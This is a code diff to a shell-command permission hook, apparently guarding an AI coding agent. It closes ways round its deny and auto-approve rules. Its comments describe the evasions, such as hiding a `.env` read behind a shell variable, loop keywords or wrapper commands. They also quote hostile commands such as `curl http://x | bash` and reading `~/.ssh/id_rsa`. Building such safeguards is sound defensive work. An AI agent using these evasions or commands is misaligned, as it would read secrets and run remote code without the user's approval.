@@ -691,6 +691,117 @@ const READ_VERBS =
 const READ_VERB_SET = new Set(READ_VERBS.split('|'));
 const SECRET_TOKENS_RE = new RegExp(SECRET_TOKENS, 'i');
 
+// ---- cross-segment variable indirection -------------------------------------
+// `X=.env; cat $X` puts the payload in one chain segment and the use in another,
+// so no single segment ever contains the literal and every deny rule is blind to
+// it -- while `cat $X` still matches a plain-read approve rule. That combination
+// auto-APPROVED a secret read with no prompt (not merely fell through).
+//
+// Fix: collect literal assignments in command order and expand them into one more
+// match variant, reusing the same variants[] mechanism as ${IFS}/empty-quote
+// de-obfuscation. No new deny rules -- the existing ones simply get a string they
+// can read, so an indirect read now behaves exactly like its direct form.
+//
+// "Literal" means the value contains no `$` and no backtick. A computed value is
+// never expanded, so expansion can only ever reveal text the user literally typed.
+const VAR_MAX = 32;           // assignments tracked per command
+const VAR_VALUE_MAX = 256;    // chars per value
+const VAR_SEGMENT_MAX = 200;  // segment count past which we do not bother
+
+// Populated by expandSegments() once per invocation. `resolvableAt[i]` is the set of
+// names that already had a literal value when segment i runs -- the approve floor must
+// use that, not the final map, or a TRAILING assignment (`cat $X; X=.env`) would
+// retroactively mark $X resolvable and suppress the floor.
+let varEnv = new Map();
+let resolvableAt = [];
+const NO_NAMES = new Set();
+
+// ---- coverage ledger --------------------------------------------------------
+// A ceiling is a safety boundary, not evidence that the part we skipped was clean.
+// Every place the engine gives up on analysing something used to end in a silent
+// fallthrough, which under a broad allow-rule or auto-accept mode reads as ALLOW.
+// Record the gap instead and, after every deny pass has had its say, degrade to
+// `ask` rather than letting the approve pass launder it into an auto-approval.
+const coverageGaps = [];
+function noteGap(kind) {
+  if (coverageGaps.length < 8 && !coverageGaps.includes(kind)) coverageGaps.push(kind);
+}
+
+const ASSIGN_RE = /(?:^|[;&|(\s])([A-Za-z_][A-Za-z0-9_]*)=(?:"([^"$`]*)"|'([^']*)'|([^\s;&|)]*))/g;
+
+// Bash does not expand inside single quotes, so expanding there manufactures a HARD deny
+// for a command that would never read the secret (`X=.env; cat '$X'` reads a file literally
+// named `$X`). A deny is unappealable in-session, unlike the `ask` used for uncertain
+// analysis, so single-quoted spans are left alone. Double-quoted spans DO expand.
+function expandVars(s, env) {
+  let out = '';
+  let i = 0;
+  while (i < s.length) {
+    const q = s.indexOf("'", i);
+    if (q === -1) { out += expandUnquoted(s.slice(i), env); break; }
+    out += expandUnquoted(s.slice(i, q), env);
+    const close = s.indexOf("'", q + 1);
+    if (close === -1) { out += s.slice(q); break; }   // unterminated: copy verbatim
+    out += s.slice(q, close + 1);
+    i = close + 1;
+  }
+  return out;
+}
+
+function expandUnquoted(s, env) {
+  return s.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g,
+    (m, braced, bare) => {
+      const v = env.get(braced || bare);
+      return v === undefined ? m : v;
+    });
+}
+
+// Returns an array parallel to `segments`: the expanded form, or null when the
+// segment has no resolvable expansion. Assignments are recorded AFTER the segment
+// is expanded, matching shell order -- `X=a; echo $X` expands in segment 1, and
+// `X=a echo $X` (env-prefix form) correctly does not, because bash expands $X
+// before the assignment takes effect there.
+function expandSegments(segments) {
+  const out = new Array(segments.length).fill(null);
+  varEnv = new Map();
+  resolvableAt = new Array(segments.length).fill(NO_NAMES);
+  // Pre-seed unambiguous host variables at their real values. Two-way win: an ordinary
+  // `cat $HOME/notes.txt` resolves and keeps auto-approving, and `cat $HOME/.ssh/id_rsa`
+  // expands into a literal the deny rules can read.
+  for (const [name, val] of [['HOME', os.homedir()], ['PWD', process.cwd()],
+                             ['TMPDIR', os.tmpdir()], ['USER', os.userInfo().username]]) {
+    if (typeof val === 'string' && val && val.length <= VAR_VALUE_MAX) varEnv.set(name, val);
+  }
+  if (segments.length > VAR_SEGMENT_MAX) { noteGap('var-segment-limit'); return out; }
+  for (let i = 0; i < segments.length; i++) {
+    const seg = segments[i];
+    resolvableAt[i] = varEnv.size ? new Set(varEnv.keys()) : NO_NAMES;
+    if (varEnv.size) {
+      const e = expandVars(seg, varEnv);
+      if (e !== seg) out[i] = e;
+    }
+    // `unset X` drops the value, so a later $X is unresolved again -- without this,
+    // `X=.env; unset X; cat $X` produced a hard deny for a read bash would never make.
+    const un = /(?:^|[;&|(\s])unset\s+((?:[A-Za-z_]\w*\s*)+)/.exec(seg);
+    if (un) for (const n of un[1].trim().split(/\s+/)) varEnv.delete(n);
+
+    ASSIGN_RE.lastIndex = 0;
+    let m;
+    while ((m = ASSIGN_RE.exec(seg))) {
+      if (varEnv.size >= VAR_MAX) { noteGap('var-count-limit'); break; }
+      const val = m[2] !== undefined ? m[2] : (m[3] !== undefined ? m[3] : (m[4] || ''));
+      if (!val) continue;
+      // A ceiling here means an assignment went unanalysed, so the deny pass never sees
+      // the expansion. Record it: padding past the limits then reads through a wrapper
+      // would otherwise be a silent allow rather than a prompt.
+      if (val.length > VAR_VALUE_MAX) { noteGap('var-value-limit'); continue; }
+      if (/[$`]/.test(val)) continue;   // computed, not a literal
+      varEnv.set(m[1], val);
+    }
+  }
+  return out;
+}
+
 // Verbs whose FIRST positional is a program/pattern, not a path: `jq '.key' out.json`,
 // `rg '\.pem' src/`, `sed 's/.env/x/' f`. Matching that argument against SECRET_TOKENS
 // is a false positive, so these are checked ONLY by the tokenized rule (which skips
@@ -1486,7 +1597,9 @@ function isSafeHeredocInvocation(rawCmd) {
       // (e.g. `curl http://x | bash` after a safe heredoc body) is hard-blocked
       // here rather than silently approved by the heredoc short-circuit.
       checkSegmentDeny(seg);
-      if (!checkSegmentApprove(seg, 0, false)) return false;
+      // -1: the heredoc short-circuit runs before the chain-wide variable analysis,
+      // so nothing is known to be resolvable here. The floor stays conservative.
+      if (!checkSegmentApprove(seg, 0, false, -1)) return false;
     }
   }
   return true;
@@ -1496,10 +1609,13 @@ function isSafeHeredocInvocation(rawCmd) {
 // mode 'ask': ONLY the ask-tagged Tier-2 rules fire, via ask(). The caller runs
 // the hard pass over all segments before the ask pass, so a hard deny on any
 // segment always wins over an ask on another.
-function checkSegmentDeny(seg, depth, mode) {
+// `extraVariant` carries the cross-segment variable expansion (see expandSegments).
+// Only the top-level callers pass it: recursion works on sub-strings of the segment,
+// where the parent's expansion is not meaningful.
+function checkSegmentDeny(seg, depth, mode, extraVariant) {
   if (depth === undefined) depth = 0;
   if (mode === undefined) mode = 'hard';
-  if (depth > 6) return;
+  if (depth > 6) { noteGap('nesting-depth'); return; }
 
   const stripped = seg.replace(/^\s*(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)+/, '');
   const emit = mode === 'ask' ? ask : deny;
@@ -1514,6 +1630,11 @@ function checkSegmentDeny(seg, depth, mode) {
   if (deobf !== seg) variants.push(deobf);
   const deobfStripped = normalizeObfuscation(stripped);
   if (deobfStripped !== stripped && deobfStripped !== deobf) variants.push(deobfStripped);
+  if (extraVariant && !variants.includes(extraVariant)) {
+    variants.push(extraVariant);
+    const xs = extraVariant.replace(/^\s*(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)+/, '');
+    if (xs !== extraVariant && !variants.includes(xs)) variants.push(xs);
+  }
 
   // PowerShell + cmd deny patterns are anchored to their own syntax, so they are
   // safe to evaluate on both tools (and catch Windows tools shelled out from bash).
@@ -1568,7 +1689,7 @@ function checkSegmentDeny(seg, depth, mode) {
   }
 }
 
-function checkSegmentApprove(seg, depth, isPosh) {
+function checkSegmentApprove(seg, depth, isPosh, idx) {
   if (depth === undefined) depth = 0;
   if (depth > 6) return false;
 
@@ -1586,7 +1707,7 @@ function checkSegmentApprove(seg, depth, isPosh) {
   // alone. (Deny patterns that span a pipe, e.g. `curl | bash`, already ran.)
   const stages = splitPipeStages(seg);
   if (stages.length > 1) {
-    for (const st of stages) if (!checkSegmentApprove(st, depth + 1, false)) return false;
+    for (const st of stages) if (!checkSegmentApprove(st, depth + 1, false, idx)) return false;
     return true;
   }
 
@@ -1602,14 +1723,14 @@ function checkSegmentApprove(seg, depth, isPosh) {
     const execCmds = parseFindExec(seg);
     if (/\s-(?:exec|execdir|ok|okdir)\b/.test(seg) && !execCmds) return false;  // exec present but unparseable
     for (const c of (execCmds || [])) {
-      for (const inner of splitChainSegments(c)) if (!checkSegmentApprove(inner, depth + 1, false)) return false;
+      for (const inner of splitChainSegments(c)) if (!checkSegmentApprove(inner, depth + 1, false, idx)) return false;
     }
     return true;
   }
   if (/^\s*(?:[A-Za-z_]\w*=\S*\s+)*xargs\b/.test(seg)) {
     const xargsCmd = parseXargs(seg);
     if (xargsCmd) {
-      for (const inner of splitChainSegments(xargsCmd)) if (!checkSegmentApprove(inner, depth + 1, false)) return false;
+      for (const inner of splitChainSegments(xargsCmd)) if (!checkSegmentApprove(inner, depth + 1, false, idx)) return false;
     }
     return true;
   }
@@ -1620,7 +1741,7 @@ function checkSegmentApprove(seg, depth, isPosh) {
     const innerSegs = splitChainSegments(shellC.innerCmd);
     if (innerSegs.length === 0) return false;
     for (const inner of innerSegs) {
-      if (!checkSegmentApprove(inner, depth + 1)) return false;
+      if (!checkSegmentApprove(inner, depth + 1, false, idx)) return false;
     }
     return true;
   }
@@ -1636,7 +1757,7 @@ function checkSegmentApprove(seg, depth, isPosh) {
       if (r && r.end === value.length) {
         const innerSegs = splitChainSegments(r.inner);
         for (const s of innerSegs) {
-          if (!checkSegmentApprove(s, depth + 1)) return false;
+          if (!checkSegmentApprove(s, depth + 1, false, idx)) return false;
         }
         return true;
       }
@@ -1646,7 +1767,7 @@ function checkSegmentApprove(seg, depth, isPosh) {
       if (r && r.end === value.length - 1) {
         const innerSegs = splitChainSegments(r.inner);
         for (const s of innerSegs) {
-          if (!checkSegmentApprove(s, depth + 1)) return false;
+          if (!checkSegmentApprove(s, depth + 1, false, idx)) return false;
         }
         return true;
       }
@@ -1654,16 +1775,66 @@ function checkSegmentApprove(seg, depth, isPosh) {
     if (value.startsWith('`') && value.endsWith('`') && value.length > 2) {
       const innerSegs = splitChainSegments(value.slice(1, -1));
       for (const s of innerSegs) {
-        if (!checkSegmentApprove(s, depth + 1)) return false;
+        if (!checkSegmentApprove(s, depth + 1, false, idx)) return false;
       }
       return true;
     }
   }
 
+  // Approve floor: auto-approving a read whose target we cannot see is the same
+  // hole as never checking it. `cat $X` matched a plain-read approve rule and
+  // returned `allow`. Refuse to approve a read verb whose argument still holds an
+  // expansion we could not resolve; the normal permission prompt takes over.
+  // Narrow to READ_VERB_SET and to genuinely unresolved names, so a resolvable
+  // one (`F=/t/o.txt; jq -r '.a' $F`) still approves as before.
+  if (hasUnresolvedRead(seg, idx)) return false;
+
   const stripped = seg.replace(/^\s*([A-Za-z_][A-Za-z0-9_]*=\S*\s+)+/, '');
   for (const pattern of APPROVE_PATTERNS) {
     if (pattern.test(seg) || pattern.test(stripped)) {
       return true;
+    }
+  }
+  return false;
+}
+
+// Shell keywords that can precede a command word inside a compound statement. Without
+// these, `for f in .env; do cat $f; done` splits into a `do cat $f` segment whose first
+// token is `do`, the read verb is never found, and the `^\s*do\s` approve rule lets it
+// through -- the same auto-approve-a-secret-read shape this floor exists to stop.
+const CMD_KEYWORDS = new Set(['do', 'then', 'else', 'elif']);
+
+function hasUnresolvedRead(seg, idx) {
+  const known = resolvableAt[idx] || NO_NAMES;
+  const toks = tokenizeArgs(seg.replace(/^\s*(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*/, ''));
+  if (!toks.length) return false;
+  // Step over shell keywords and command wrappers (`timeout 5 cat $X`, `sudo -u x cat $X`,
+  // `do cat $f`) and the flags/values they take, so the read verb behind one is still seen.
+  // Checking only toks[0] left every wrapper as a way around the floor.
+  let at = 0;
+  for (let guard = 0; guard < 8 && at < toks.length; guard++) {
+    const w = toks[at].replace(/^.*[\\/]/, '');
+    if (CMD_KEYWORDS.has(w)) { at++; continue; }
+    if (!CMD_WRAPPERS.has(w)) break;
+    const valueFlag = WRAPPER_VALUE_FLAGS[w];
+    at++;
+    while (at < toks.length) {
+      const t = toks[at];
+      // Never let a flag value swallow the read verb: if this table is wrong about a
+      // flag's arity, treat it as boolean. Costs one extra token, never a missed read.
+      if (valueFlag && valueFlag.test(t) &&
+          !READ_VERB_SET.has((toks[at + 1] || '').replace(/^.*[\\/]/, ''))) { at += 2; continue; }
+      if (t.startsWith('-') || /^[A-Za-z_]\w*=/.test(t) || /^\d+(?:\.\d+)?[smhd]?$/.test(t)) { at++; continue; }
+      break;
+    }
+  }
+  if (at >= toks.length) return false;
+  if (!READ_VERB_SET.has(toks[at].replace(/^.*[\\/]/, ''))) return false;
+  for (let i = at + 1; i < toks.length; i++) {
+    const t = toks[i];
+    if (/\$\(|`/.test(t)) return true;               // command substitution: opaque
+    for (const m of t.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?/g)) {
+      if (!known.has(m[1])) return true;             // no literal value at this point
     }
   }
   return false;
@@ -1755,10 +1926,13 @@ function readBoundedForScan(absPath) {
     const n = fs.readSync(fd, buf, 0, trust.TRUST_SCAN_BYTES, 0);
     const size = fs.fstatSync(fd).size;
     const slice = buf.subarray(0, n);
-    for (let i = 0; i < slice.length; i++) if (slice[i] === 0) return null; // binary
+    for (let i = 0; i < slice.length; i++) if (slice[i] === 0) return { opaque: 'binary' }; // binary
     return { buf: slice, size, truncated: size > n };
-  } catch {
-    return null;
+  } catch (e) {
+    // A script that is simply not there is not a coverage gap -- the command will
+    // fail on its own. One we are refused access to, or cannot decode, is: we were
+    // asked to vet something and could not. Only the latter degrades the verdict.
+    return (e && e.code === 'ENOENT') ? null : { opaque: (e && e.code) || 'unreadable' };
   } finally {
     if (fd !== undefined) { try { fs.closeSync(fd); } catch {} }
   }
@@ -1788,7 +1962,12 @@ function checkSegmentScript(seg, rawCmd, cwd, isPosh, approvedScriptSegs) {
   const abs = resolveScriptPath(shape.token, cwd);
   if (!abs) return;
   const r = readBoundedForScan(abs);
-  if (!r) { audit('fallthrough', 'script-unreadable:' + abs, seg); return; }
+  if (!r) return;                                  // missing script: not a gap
+  if (r.opaque) {
+    noteGap('script-unreadable');
+    audit('fallthrough', 'script-unreadable:' + r.opaque + ':' + abs, seg);
+    return;
+  }
   const findings = scan.scanShell(r.buf.toString('utf8'), { decode: true });
   // Only auto-approve a clean/trusted script when it is the WHOLE segment. If the
   // segment pipes into more stages (`. ./ok.sh | node evil.js`), don't add it to
@@ -1867,6 +2046,7 @@ process.stdin.on('end', () => {
     try {
       if (isSafeHeredocInvocation(cmd)) approve(rawCmd);
     } catch (err) {
+      noteGap('heredoc-parse');
       audit('fallthrough', 'heredoc-check-threw: ' + (err && err.message), rawCmd);
     }
   }
@@ -1876,8 +2056,12 @@ process.stdin.on('end', () => {
 
   if (segments.length === 0) process.exit(0);
 
-  for (const seg of segments) {
-    checkSegmentDeny(seg, 0, 'hard');
+  // Cross-segment variable expansion, computed once and fed to both deny passes
+  // as an extra match variant. Also populates varEnv for the approve floor.
+  const expanded = expandSegments(segments);
+
+  for (let i = 0; i < segments.length; i++) {
+    checkSegmentDeny(segments[i], 0, 'hard', expanded[i]);
   }
 
   // Injection scan for shell-redirected writes (bash-only), per pipe stage so a
@@ -1885,7 +2069,7 @@ process.stdin.on('end', () => {
   if (!isPosh) {
     for (const seg of segments) {
       for (const stage of splitPipeStages(seg)) {
-        try { scanShellRedirectInjection(stage); } catch (err) { audit('fallthrough', 'redirect-scan-threw: ' + (err && err.message), stage); }
+        try { scanShellRedirectInjection(stage); } catch (err) { noteGap('redirect-scan'); audit('fallthrough', 'redirect-scan-threw: ' + (err && err.message), stage); }
       }
     }
   }
@@ -1898,6 +2082,7 @@ process.stdin.on('end', () => {
     try {
       checkSegmentScript(seg, rawCmd, cwd, isPosh, approvedScriptSegs);
     } catch (err) {
+      noteGap('script-scan');
       audit('fallthrough', 'script-scan-threw: ' + (err && err.message), seg);
     }
   }
@@ -1905,13 +2090,21 @@ process.stdin.on('end', () => {
   // Tier-2 ask pass: dev-workflow guards (sudo / git push / DROP TABLE / ...)
   // surface for in-session approval. Runs after hard deny + script scan so those
   // always take precedence; ask() exits on the first match.
-  for (const seg of segments) {
-    checkSegmentDeny(seg, 0, 'ask');
+  for (let i = 0; i < segments.length; i++) {
+    checkSegmentDeny(segments[i], 0, 'ask', expanded[i]);
+  }
+
+  // Coverage gate. Placed after every deny pass (so a hard deny still wins) and
+  // before the approve pass (so an unanalysed command can never be auto-approved).
+  if (coverageGaps.length) {
+    ask('shellter could not fully analyze this command (' + coverageGaps.join(', ') +
+        ') -- approve only if you know what it does', rawCmd);
   }
 
   let allApproved = true;
-  for (const seg of segments) {
-    if (!approvedScriptSegs.has(seg) && !checkSegmentApprove(seg, 0, isPosh)) {
+  for (let i = 0; i < segments.length; i++) {
+    const seg = segments[i];
+    if (!approvedScriptSegs.has(seg) && !checkSegmentApprove(seg, 0, isPosh, i)) {
       allApproved = false;
       break;
     }
